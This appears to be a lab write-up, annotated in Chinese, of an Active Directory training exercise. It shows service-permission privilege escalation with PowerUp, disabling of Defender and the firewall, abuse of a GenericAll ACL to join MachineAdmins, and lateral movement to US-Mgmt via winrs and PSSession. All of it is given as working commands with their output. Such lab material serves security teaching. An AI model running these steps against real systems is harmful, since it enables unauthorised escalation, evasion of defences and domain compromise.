Task
•  Exploit a service on studentx and elevate privileges to local administrator.
•  Identify a machine in the domain where studentuserx has local administrative access due to group membership.

# Exploit a service on studentx and elevate privileges to local administrator.

```
PS C:\AD\Tools> . .\PowerUp.ps1
PS C:\AD\Tools> Invoke-AllChecks
[*] Checking service permissions...


ServiceName   : ALG
Path          : C:\Windows\System32\alg.exe
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'ALG'
CanRestart    : True
```

尝试提权
```
PS C:\AD\Tools> Invoke-ServiceAbuse -Name 'ALG' -UserName 'us\studentuser138'

ServiceAbused Command
------------- -------
ALG           net localgroup Administrators us\studentuser138 /add
```

重启
```
PS C:\AD\Tools>sc.exe stop ALG
PS C:\AD\Tools>sc.exe start ALG
```

sign out以后重新连接，已经是本地administrator权限

```
PS C:\Windows\system32> whoami /all

USER INFORMATION
----------------

User Name         SID
================= =============================================
us\studentuser138 S-1-5-21-210670787-2521448726-163245708-11628


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                          Attributes
========================================== ================ ============================================ ===============================================================
Everyone                                   Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                 Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                     Alias            S-1-5-32-544                                 Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                              Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0                                      Mandatory group, Enabled by default, Enabled group
US\managers                                Group            S-1-5-21-210670787-2521448726-163245708-1117 Mandatory group, Enabled by default, Enabled group
US\studentusers                            Group            S-1-5-21-210670787-2521448726-163245708-1116 Mandatory group, Enabled by default, Enabled group
US\maintenanceusers                        Group            S-1-5-21-210670787-2521448726-163245708-1119 Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288
```


关闭wd和防火墙
```
PS C:\Windows\system32> Set-MpPreference -DisableRealtimeMonitoring $true -Verbose
VERBOSE: Performing operation 'Update MSFT_MpPreference' on Target 'ProtectionManagement'.

PS C:\Windows\system32> NetSh Advfirewall set allprofiles state off
Ok.
```

# Identify a machine in the domain where studentuserx has local administrative access due to group membership.

引入ActiveDirectory module


```
PS C:\ad\Tools> Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
PS C:\ad\Tools> Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
PS C:\ad\Tools>
```

把下面代码保存成1.ps1文件

```
function Get-ADPrincipalGroupMembershipRecursive ($SamAccountName){
$groups = @(Get-ADPrincipalGroupMembership -Identity $SamAccountName | select -ExpandProperty distinguishedname)
$groups
if ($groups.count -gt 0){
	foreach ($group in $groups){
		Get-ADPrincipalGroupMembershipRecursive $group
		}
	}
}
```

引入

```
PS C:\ad\Tools> Import-Module C:\AD\Tools\ADModule-master\1.ps1
```

使用,递归枚举组关系，当前用于分别有以下组权限
```
PS C:\ad\Tools> Get-ADPrincipalGroupMembershipRecursive "studentuser138"
CN=Domain Users,CN=Users,DC=us,DC=techcorp,DC=local
CN=StudentUsers,CN=Users,DC=us,DC=techcorp,DC=local
CN=Users,CN=Builtin,DC=us,DC=techcorp,DC=local
CN=MaintenanceUsers,CN=Users,DC=us,DC=techcorp,DC=local
CN=Managers,CN=Users,DC=us,DC=techcorp,DC=local
```

依次枚举上面各个组有什么有用的acl，Managers这个组有东西
```
PS C:\ad\Tools> Find-InterestingDomainAcl -ResolveGUIDs |?{$_.IdentityReferenceName -match 'managers'}
WARNING: [Find-InterestingDomainAcl] Unable to convert SID 'S-1-5-21-210670787-2521448726-163245708-1147' to a
distinguishedname with Convert-ADName
WARNING: [Find-InterestingDomainAcl] Unable to convert SID 'S-1-5-21-210670787-2521448726-163245708-1147' to a
distinguishedname with Convert-ADName
WARNING: [Find-InterestingDomainAcl] Unable to convert SID 'S-1-5-21-210670787-2521448726-163245708-1147' to a
distinguishedname with Convert-ADName


...


ObjectDN                : CN=MachineAdmins,OU=Mgmt,DC=us,DC=techcorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : All
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowedObject
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-210670787-2521448726-163245708-1117
IdentityReferenceName   : managers
IdentityReferenceDomain : us.techcorp.local
IdentityReferenceDN     : CN=Managers,CN=Users,DC=us,DC=techcorp,DC=local
IdentityReferenceClass  : group
```



也可以使用下面pv命令枚举managers组的acl
```
PS C:\ad\Tools> Get-DomainObjectAcl -Identity machineadmins -ResolveGUIDs |ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match 'managers'}


....

AceQualifier           : AccessAllowed
ObjectDN               : CN=MachineAdmins,OU=Mgmt,DC=us,DC=techcorp,DC=local
ActiveDirectoryRights  : GenericAll
ObjectAceType          : All
ObjectSID              : S-1-5-21-210670787-2521448726-163245708-1118
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : InheritedObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-210670787-2521448726-163245708-1117
AccessMask             : 983551
AuditFlags             : None
IsInherited            : True
AceFlags               : ContainerInherit, Inherited
InheritedObjectAceType : Group
OpaqueLength           : 0
IdentityName           : US\managers
```

所以，studentuser138通过Manager组的组员身份，对machineadmins组拥有GenericAll权限

查看machineadmins的组描述
```
PS C:\ad\Tools>  Get-ADGroup -Identity machineadmins -Properties Description


Description       : Group to manage machines of the Mgmt OU
DistinguishedName : CN=MachineAdmins,OU=Mgmt,DC=us,DC=techcorp,DC=local
GroupCategory     : Security
GroupScope        : Global
Name              : MachineAdmins
ObjectClass       : group
ObjectGUID        : a02c806e-f233-4c39-a0cc-adf37628365a
SamAccountName    : machineadmins
SID               : S-1-5-21-210670787-2521448726-163245708-1118
```

因为MachineAdmins组对Mgmt这台计算机有本地管理员权限，当前账号对MachineAdmins组有GenericAll权限，因此可以通过添加当前用户studentuser138到MachineAdmins组，从而获得对Mgmt这台计算机的管理权限

```
PS C:\ad\Tools> Add-ADGroupMember -Identity MachineAdmins -Members studentuser138 -Verbose
VERBOSE: Performing the operation "Set" on target "CN=MachineAdmins,OU=Mgmt,DC=us,DC=techcorp,DC=local".
PS C:\ad\Tools>
```

完成上面操作以后要logoff以后再login，这样session才会在新的tgt下


登录以后可以枚举到现在可以登录的机器里有mgmt
```
PS C:\ad\Tools> . .\Find-PSRemotingLocalAdminAccess.ps1
PS C:\ad\Tools> Find-PSRemotingLocalAdminAccess
student138
US-Mgmt
```

可以使用winrs命令横向到mgmt
```
PS C:\ad\Tools> winrs -r:us-mgmt cmd
Microsoft Windows [Version 10.0.17763.2928]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\studentuser138>whoami
whoami
us\studentuser138

C:\Users\studentuser138>hostname
hostname
US-Mgmt
```

也可以用powershell直接横向
```
PS C:\ad\Tools>  $usmgmt = New-PSSession us-mgmt
PS C:\ad\Tools> Enter-PSSession $usmgmt
[us-mgmt]: PS C:\Users\studentuser138\Documents> whoami
us\studentuser138
[us-mgmt]: PS C:\Users\studentuser138\Documents> hostname
US-Mgmt
```